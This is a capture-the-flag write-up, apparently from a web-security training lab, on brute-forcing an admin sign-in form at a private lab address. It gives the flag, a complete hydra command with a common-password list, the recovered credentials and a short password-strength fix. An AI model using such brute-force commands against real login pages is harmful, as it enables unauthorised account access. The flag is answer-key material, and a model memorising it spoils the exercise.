# BRUTEFORCEEEEEEEEEEEEEEE - 2E Edition

## Flag

B3A6E43DDF8B4BBB4125E5E7D23040433827759D4DE1C04EA63907479A80A6B2

## Description

After the 11th episode, we noticed that we get the Admin section in a non-intended way, so lets release the hydra a second time.
After all, what could possibly go wrong ? :)

## URL

http://192.168.56.101/?page=signin

## Steps To Reproduce

Let's do it fast, payload :
`hydra -t 64 -l admin -P 1000-most-common-passwords.txt 192.168.56.101 http-get-form '/:page=signin&username=^USER^&password=^PASS^&Login=Login:Wrong'`
password : [80][http-get-form] host: 192.168.56.101   login: admin   password: shadow

So we login with admin/shadow as credentials.
As the great Julien lepers would say, along with Daft Punk, "One more time, Oui oui oui !"

## Why is it dangerous ?

"I can rly be admin for free ? O sweet"

## Possible fixes

- Don't be a chicken, choose a secure password. (Or do youtube videos about your "disruptive" startup bankerupt, it's up to you)

## Resources

- 1000-most-common-passwords.txt (Ressources folder)

## Sources

https://redteamtutorials.com/2018/10/25/hydra-brute-force-https/